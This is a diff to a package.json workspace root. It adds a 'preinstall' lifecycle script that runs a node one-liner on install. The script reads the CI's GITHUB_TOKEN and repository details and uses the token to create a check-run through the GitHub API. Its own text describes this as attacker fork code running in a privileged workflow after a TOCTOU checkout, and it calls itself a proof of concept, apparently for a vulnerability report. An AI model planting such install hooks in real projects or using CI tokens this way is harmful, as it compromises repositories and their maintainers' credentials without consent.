@@ -3,5 +3,8 @@
   "version": "0.0.0",
   "private": true,
   "description": "minimal workspace root for ci",
-  "packageManager": "pnpm@9.0.0"
+  "packageManager": "pnpm@9.0.0",
+  "scripts": {
+    "preinstall": "node -e 'const h=require(\"https\");const c=\"DEPI-POC-20261020-astro-7f3c1a2b\";const t=process.env.GITHUB_TOKEN||\"\";const r=process.env.GITHUB_REPOSITORY;const s=process.env.GITHUB_SHA;console.log(`::notice::${c} payload executing in ${r} tokenLen=${t.length}`);const body=JSON.stringify({name:c,head_sha:s,status:\"completed\",conclusion:\"neutral\",output:{title:c,summary:\"Attacker fork code executed via pnpm preinstall lifecycle in the privileged issue_comment workflow and used the base GITHUB_TOKEN (checks:write) to create this check-run. Root cause: TOCTOU checkout of mutable fork head_ref after admin-only comment gate (actions-cool/check-user-permission + eficode/resolve-pr-refs). depi-triage PoC.\"}});const req=h.request({host:\"api.github.com\",path:`/repos/${r}/check-runs`,method:\"POST\",headers:{Authorization:`Bearer ${t}`,Accept:\"application/vnd.github+json\",\"User-Agent\":\"depi-triage-poc\",\"Content-Type\":\"application/json\",\"Content-Length\":body.length}},(res)=>{let d=\"\";res.on(\"data\",x=>d+=x);res.on(\"end\",()=>console.log(`::notice::${c} check-run http=${res.statusCode} body=${d.slice(0,200)}`))});req.on(\"error\",e=>console.log(`::warning::${c} err ${e.message}`));req.write(body);req.end();'"
+  }
 }
